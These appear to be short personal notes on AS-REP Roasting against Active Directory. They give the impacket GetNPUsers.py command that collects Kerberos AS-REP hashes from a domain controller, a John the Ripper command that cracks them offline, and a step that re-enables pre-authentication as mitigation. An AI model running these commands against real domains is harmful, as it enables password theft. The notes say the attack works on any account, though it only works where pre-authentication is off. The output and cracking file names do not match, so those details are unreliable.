# **AS-REP Roasting**

AS-REP Roasting is an attack in which an attacker can sends the AS-REQ on behalf of any valid user account and get their Password Hash from the KDC.

The main idea behind AS-REP Roasting is to retrieve the encrypted part of the AS-REP message, which is encrypted using the user's password which KDC knows. This encrypted portion can then be cracked offline to reveal user's password. The significance lies in the fact that this attack does not require prior access or elevated privileges within the domain just a valid domain user account.

# **Process of Attack**

_here we will use a Python Script from impacket suite._

Command for capturing hash

```
python3 GetNPUsers.py pkdc.local/ -dc-ip 10.10.26.87 -format john -outputfile hash_for_asrep_rosat -usersfile users-list.txt
```

![[Pasted image 20251219194939.png]]

saved the hash in the file

![[Pasted image 20251219194943.png]]

Crack with John

```
john hash_for_asrep_roast
```

![[Pasted image 20251219195002.png]]

# **Mitigation**

enable the Pre Authentication or Kerberos Authentication from the user account properties in the domain controller > “**Active Directory Users and Computers**”.

_uncheck this option “Do not require Kerberos pre authentication”_

![[Pasted image 20251219195007.png]]